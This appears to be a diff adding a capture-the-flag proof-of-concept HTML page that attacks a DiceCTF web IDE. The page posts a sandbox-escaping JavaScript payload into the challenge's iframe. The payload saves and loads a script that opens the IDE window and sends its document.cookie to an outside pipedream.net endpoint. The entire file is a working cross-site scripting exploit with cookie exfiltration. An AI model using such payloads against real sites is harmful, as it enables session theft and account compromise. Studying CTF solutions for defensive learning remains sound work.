@@ -1,0 +1,22 @@
+<!doctype html>
+<html>
+  <head>
+    <title>xss poc</title>
+    <script>
+        async function sendMessage() {
+            // window open -> make file -> include it
+            const cmd="[].constructor.constructor(\"(async () => {const res = await fetch('https://web-ide.dicec.tf/ide/save', {method:'POST', headers: {'Content-Type': 'application/javascript'}, body: 'const myWindow = window.open(\\\"/ide\\\"); (async (myWindow) => { await setTimeout( async() => {await fetch(`https://en20uuq0p0wxmkp.m.pipedream.net/?flag=${myWindow.document.cookie}`)}, 500) })(myWindow)'}); const file_name = await res.text(); const scr = document.createElement('script'); scr.src = `/ide/saves/${file_name}`; document.body.appendChild(scr);})()\")()"
+            
+            await new Promise((r) => { window.addEventListener(('load'), r); });
+            document.querySelector('iframe')
+              .contentWindow
+              .postMessage(cmd, '*');  // IDE -> sandbox message
+        };
+    </script>
+  </head>
+  <body>
+      <img src='x' onerror="sendMessage()" />
+      <iframe name='hh' src="https://web-ide.dicec.tf/sandbox.html" frameborder="0"></iframe>
+  </body>
+</html>
+
